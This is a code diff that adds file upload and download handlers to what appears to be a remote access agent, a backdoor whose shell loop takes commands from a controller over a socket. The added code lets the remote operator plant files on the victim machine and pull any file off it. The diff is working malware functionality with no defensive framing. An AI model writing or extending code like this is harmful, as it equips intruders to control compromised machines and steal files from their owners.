@@ -76,12 +76,59 @@ def is_admin():
     except:
         return False
 
+def handle_file_transfer(command_data):
+    try:
+        if command_data['command'] == 'upload':
+            # Receive file size
+            size_data = s.recv(8)
+            file_size = int.from_bytes(size_data, byteorder='big')
+            
+            # Receive and save file
+            filename = command_data['filename']
+            received = 0
+            with open(filename, 'wb') as f:
+                while received < file_size:
+                    chunk = s.recv(min(4096, file_size - received))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    received += len(chunk)
+            
+            if received == file_size:
+                reliable_send({'success': True})
+            else:
+                reliable_send({'error': 'Upload incomplete'})
+                
+        elif command_data['command'] == 'download':
+            filename = command_data['filename']
+            try:
+                with open(filename, 'rb') as f:
+                    file_data = f.read()
+                    
+                # Send file size first
+                s.sendall(len(file_data).to_bytes(8, byteorder='big'))
+                # Send file data
+                s.sendall(file_data)
+                
+            except FileNotFoundError:
+                reliable_send({'error': 'File not found'})
+            except Exception as e:
+                reliable_send({'error': str(e)})
+                
+    except Exception as e:
+        reliable_send({'error': str(e)})
+
 def shell():
     while True:
         try:
             command = reliable_recv()
             if not command:
                 break
+                
+            if isinstance(command, dict):
+                if command.get('command') in ['upload', 'download']:
+                    handle_file_transfer(command)
+                    continue
                 
             if command == 'quit':
                 print("[*] Terminating agent...")
